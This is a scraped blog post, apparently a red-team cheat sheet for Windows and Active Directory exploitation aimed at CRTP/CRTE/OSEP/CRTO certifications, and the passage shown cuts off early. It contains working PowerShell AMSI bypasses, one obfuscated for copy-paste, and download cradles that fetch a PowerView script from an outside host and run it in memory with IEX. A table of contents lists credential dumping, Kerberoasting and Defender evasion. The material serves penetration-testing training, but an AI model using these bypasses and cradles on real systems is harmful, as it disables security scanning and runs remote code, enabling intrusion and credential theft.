---
title: Windows & Active Directory Exploitation Cheat Sheet and Command Reference
url: https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
source: Over Security - Cybersecurity news aggregator
date: 2022-10-22
fetch_date: 2025-10-03T20:37:47.813851
---

# Windows & Active Directory Exploitation Cheat Sheet and Command Reference

[>
Security Ramblings](/)

* [About](/about/)
* [Blog](/posts/)

31 minutes

# [Windows & Active Directory Exploitation Cheat Sheet and Command Reference](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)

---

Table of Contents

* [General](#general)
  + [PowerShell AMSI Bypass](#powershell-amsi-bypass)
  + [PowerShell one-liners](#powershell-one-liners)
* [Enumeration](#enumeration)
  + [AD Enumeration With PowerView](#ad-enumeration-with-powerview)
  + [AppLocker](#applocker)
  + [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
  + [LAPS](#laps)
* [Lateral Movement](#lateral-movement)
  + [Lateral Movement Enumeration With PowerView](#lateral-movement-enumeration-with-powerview)
  + [BloodHound](#bloodhound)
  + [Kerberoasting](#kerberoasting)
  + [AS-REP roasting](#as-rep-roasting)
  + [Token Manipulation](#token-manipulation)
  + [Lateral Movement with Rubeus](#lateral-movement-with-rubeus)
  + [Lateral Movement with Mimikatz](#lateral-movement-with-mimikatz)
  + [Command execution with scheduled tasks](#command-execution-with-scheduled-tasks)
  + [Command execution with WMI](#command-execution-with-wmi)
  + [Command execution with PowerShell Remoting](#command-execution-with-powershell-remoting)
  + [Unconstrained delegation](#unconstrained-delegation)
  + [Constrained delegation](#constrained-delegation)
  + [Resource-based constrained delegation](#resource-based-constrained-delegation)
  + [Abusing domain trust](#abusing-domain-trust)
  + [Abusing inter-forest trust](#abusing-inter-forest-trust)
  + [Abusing MSSQL databases for lateral movement](#abusing-mssql-databases-for-lateral-movement)
  + [Abusing Group Policy Objects for lateral movement](#abusing-group-policy-objects-for-lateral-movement)
* [Privilege Escalation](#privilege-escalation)
  + [PowerUp](#powerup)
  + [UAC Bypass](#uac-bypass)
* [Persistence](#persistence)
  + [Startup folder](#startup-folder)
* [Domain Persistence](#domain-persistence)
  + [Mimikatz skeleton key attack](#mimikatz-skeleton-key-attack)
  + [Grant specific user DCSync rights with PowerView](#grant-specific-user-dcsync-rights-with-powerview)
  + [Domain Controller DSRM admin](#domain-controller-dsrm-admin)
  + [Modifying security descriptors for remote WMI access](#modifying-security-descriptors-for-remote-wmi-access)
  + [Modifying security descriptors for PowerShell Remoting access](#modifying-security-descriptors-for-powershell-remoting-access)
  + [Modifying DC registry security descriptors for remote hash retrieval using DAMP](#modifying-dc-registry-security-descriptors-for-remote-hash-retrieval-using-damp)
  + [DCShadow](#dcshadow)
* [Post-Exploitation](#post-exploitation)
  + [LSASS protection](#lsass-protection)
  + [Dumping OS credentials with Mimikatz](#dumping-os-credentials-with-mimikatz)
  + [Abusing the Data Protection API (DPAPI) with Mimikatz](#abusing-the-data-protection-api-dpapi-with-mimikatz)
  + [Dumping secrets without Mimikatz](#dumping-secrets-without-mimikatz)
  + [Windows Defender evasion](#windows-defender-evasion)
  + [Chisel proxying](#chisel-proxying)
  + [Juicy files](#juicy-files)

---

*Last update: **November 3rd, 2021***

*Updated **November 3rd, 2021**: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well* ðŸ™ƒ.

*Updated **June 5th, 2021**: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurityâ€™s â€˜Red Team Opsâ€™ course (for the CRTO certification). Iâ€™ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)*

*Updated **March 26th, 2021**: This blog post has been updated based on some tools and techniques from Offensive Securityâ€™s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.*

Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation. It is largely aimed at completing these two certifications, but should be useful in a lot of cases when dealing with Windows / AD exploitation.

That being said - it is *far from* an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch. I will try to keep it updated as much as possible!

Many items of this list are shamelessly stolen from certification courses (that come highly recommended) that discuss Active Directory, such as [CRTP](https://www.alteredsecurity.com/adlab), [CRTE](https://www.alteredsecurity.com/redteamlab), [OSEP](https://www.offensive-security.com/pen300-osep/), and [CRTO](https://www.zeropointsecurity.co.uk/red-team-ops).
If you are looking for the cheat sheet and command reference I used for OSCP, please refer to [this post](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/).

*Note: I tried to highlight some poor OpSec choices for typical red teaming engagements with ðŸš©. I will likely have missed some though, so make sure you **understand what you are running** before you run it!*

## General

### PowerShell AMSI Bypass

Patching the Anti-Malware Scan Interface (AMSI) will help bypass AV warnings triggered when executing PowerShell scripts (or other AMSI-enabled content, such as JScript) that are marked as malicious. Do not use as-is in covert operations, as they will get flagged ðŸš©. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts to beat signature-based detection.

â€˜Plainâ€™ AMSI bypass example:

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Obfuscation example for copy-paste purposes:

```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another bypass, which is not detected by PowerShell autologging:

```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

> More bypasses [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell). For obfuscation, check [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), or get a custom-generated obfuscated version at [amsi.fail](https:///amsi.fail).

### PowerShell one-liners

#### Load PowerShell script reflectively

Proxy-aware:

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```

Non-proxy aware:

```
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```

> Again, this will likely get flagged ðŸš©. For opsec-safe download cradles, check out [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter).

#### Load C# assembly reflectively

Ensure that the referenc...